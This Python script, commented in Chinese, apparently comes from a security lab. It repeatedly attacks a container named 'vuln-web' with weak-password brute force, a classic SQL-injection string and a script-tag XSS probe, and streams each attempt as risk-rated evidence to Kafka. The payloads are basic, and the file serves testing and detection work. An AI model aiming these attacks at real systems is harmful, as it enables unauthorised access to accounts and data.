import time
import json
import requests
import os
from kafka import KafkaProducer

KAFKA_BROKER = os.environ.get('KAFKA_BROKER', 'kafka:9092')
TOPIC = 'evidence_topic'

LOGIN_URL = 'http://vuln-web:5000/login'
SEARCH_URL = 'http://vuln-web:5000/search'
XSS_URL   = 'http://vuln-web:5000/feedback'

def get_producer():
    while True:
        try:
            return KafkaProducer(
                bootstrap_servers=[KAFKA_BROKER],
                value_serializer=lambda x: json.dumps(x).encode('utf-8')
            )
        except: time.sleep(5)

# --- 新增：风险评估算法 ---
def calculate_risk(attack_type, success):
    if not success:
        return "INFO"  # 攻击失败，仅作为日志记录

    # 根据威胁程度定级
    if attack_type == "sql_injection":
        return "HIGH"    # 高危：由于能泄露机密数据
    elif attack_type == "brute_force":
        return "MEDIUM"  # 中危：获取了账号权限
    elif attack_type == "xss_attack":
        return "LOW"     # 低危：通常只影响客户端
    return "INFO"

def send_evidence(producer, attack_type, target, payload, success, http_status=0):
    # 1. 计算风险等级
    risk = calculate_risk(attack_type, success)

    evidence = {
        "timestamp": time.time(),
        "attack_type": attack_type,
        "target": target,
        "payload": payload,
        "result": "success" if success else "fail",
        "http_status": http_status,
        "risk_level": risk  # 2. 加入风险字段
    }
    producer.send(TOPIC, value=evidence)
    producer.flush()
    # 日志里也打印出风险等级
    print(f"[*] [{risk}] {attack_type} -> {evidence['result']}")

def run_brute_force(producer):
    print("\n--- [1/3] 弱口令测试 ---")
    for pwd in ["123456", "admin123"]:
        try:
            resp = requests.post(LOGIN_URL, json={"username": "admin", "password": pwd}, timeout=1)
            send_evidence(producer, "brute_force", LOGIN_URL, pwd, resp.status_code==200, resp.status_code)
            if resp.status_code == 200: break
        except: pass
        time.sleep(0.5)

def run_sql_injection(producer):
    print("\n--- [2/3] SQL注入测试 ---")
    for pay in ["admin", "' OR '1'='1"]:
        try:
            resp = requests.get(SEARCH_URL, params={"q": pay}, timeout=1)
            success = (resp.status_code == 200)
            send_evidence(producer, "sql_injection", SEARCH_URL, pay, success, resp.status_code)
        except: pass
        time.sleep(1)

def run_xss_scan(producer):
    print("\n--- [3/3] XSS测试 ---")
    payload = "<script>alert(1)</script>"
    try:
        resp = requests.post(XSS_URL, json={"content": payload}, timeout=1)
        # 简单判断回显
        success = payload in resp.text
        send_evidence(producer, "xss_attack", XSS_URL, payload, success, resp.status_code)
    except: pass
    time.sleep(1)

if __name__ == '__main__':
    producer = get_producer()
    print("风险评估模块已加载...")
    while True:
        run_brute_force(producer)
        run_sql_injection(producer)
        run_xss_scan(producer)
        time.sleep(3)
